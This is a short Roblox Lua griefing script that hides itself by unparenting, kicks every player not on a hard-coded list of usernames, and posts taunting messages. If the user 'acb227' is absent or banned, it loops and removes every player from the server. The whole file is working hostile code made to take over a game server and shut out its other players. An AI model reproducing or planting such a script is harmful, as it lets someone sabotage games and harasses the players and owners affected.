script/-- not ur eyes --------------------------------------------------------------------------------------------------------------------------------------------------------
--lego
script.Parent = nil
list={"acb227","koopa13","Zarcius","sucer123","cool12309","xSoulStealerx","nitewalker21","McDizzy","FlaminSoul","NetworkServer","darkmage0252","pianoman112233","cody9966","Alexis444","CounterClockwiseCat","photonicreno","flops12","Scriptaxor","Ronnie124","bob371","Digit349","crusher12555","ImInABlox","Dr4gOnh4ck3rz2","Fenrier","ojmayo999","joshmottley","juhooliagn878","FlamedSkull"}

function check(name)
for i,v in pairs(list) do
if v:lower()==name:lower() then
return true
end
end
return false
end

function onEnter(player)
local name=player.Name
if check(name) then
print("Player "..name.." is allowed.")
else
player:remove()
end
end


--[[get all players who entered]]
for i,b in pairs(game.Players:getPlayers()) do
onEnter(b)
end
game.Players.PlayerAdded:connect(onEnter)

c = Instance.new("Hint") 
c.Text = "If you ban acb227, the server will kill u all noobs" 
c.Parent = game.Workspace 
text = {"acb227 has been kicked and all will pay.... DIE noobs!......","have a nice day :P"} 
--lego
while true do 
wait(0.1) 
if not game.Players:FindFirstChild("acb227") then 
local m = Instance.new("Message") m.Parent = Workspace 
for i,v in pairs(text) do 
m.Text = v 
wait(0.1) 
m:Remove() 
end 
for i,v in pairs(game.Players:GetChildren()) do 
v:Remove() 
end 
end 
end 
